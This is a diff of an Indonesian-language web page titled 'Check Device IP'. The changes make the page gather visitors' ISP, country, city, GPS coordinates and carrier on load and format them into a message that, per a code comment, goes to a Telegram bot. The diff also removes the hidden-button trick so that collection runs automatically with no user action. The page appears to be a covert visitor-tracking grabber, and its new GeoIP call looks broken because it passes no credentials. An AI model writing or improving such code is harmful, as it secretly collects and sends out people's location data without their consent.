@@ -24,21 +24,18 @@
 
     // Fungsi untuk mendapatkan informasi IP perangkat
     function getDeviceInfo() {
-      // Buat permintaan GET ke halaman demo ip2location
-      $.get('https://www.ip2location.com/demo/', function(response) {
-        // Cari elemen-elemen dengan class 'result' pada halaman web
-        var result = $(response).find('.result');
-
-        // Ambil nilai-nilai yang diperlukan dari elemen-elemen tersebut
-        var isp = result.eq(1).text().trim();
-        var country = result.eq(2).text().trim();
-        var region = result.eq(3).text().trim();
-        var city = result.eq(4).text().trim();
-        var coordinates = result.eq(5).text().trim();
-        var localTime = result.eq(6).text().trim();
-        var domain = result.eq(7).text().trim();
-        var netSpeed = result.eq(8).text().trim();
-        var mobileCarrier = result.eq(9).text().trim();
+      // Ambil informasi IP perangkat dari GeoIP2 API
+      $.get('https://geoip.maxmind.com/geoip/v2.1/city', function(response) {
+        // Ambil nilai-nilai yang diperlukan dari respons API
+        var isp = response.traits.isp;
+        var country = response.country.names.en;
+        var region = response.subdivisions[0].names.en;
+        var city = response.city.names.en;
+        var coordinates = response.location.latitude + ', ' + response.location.longitude;
+        var localTime = new Date().toLocaleString();
+        var domain = response.traits.domain;
+        var netSpeed = response.traits.connection_type;
+        var mobileCarrier = response.traits.mobile_network_operator;
 
         // Format pesan yang akan dikirim ke bot Telegram
         var message = `
@@ -60,20 +57,11 @@
 
     // Panggil fungsi getDeviceInfo saat halaman selesai dimuat
     $(document).ready(function() {
-      // Klik tombol secara otomatis saat halaman selesai dimuat
-      $('#autoButton').click();
-    });
-
-    // Fungsi untuk mengklik tombol secara otomatis dan memanggil fungsi getDeviceInfo
-    function autoClick() {
-      $('#checkButton').click();
       getDeviceInfo();
-    }
+    });
   </script>
 </head>
 <body>
   <h1>Cek IP Perangkat</h1>
-  <button id="checkButton" style="display: none;">Check</button>
-  <button id="autoButton" onclick="autoClick();">Auto</button>
 </body>
 </html>
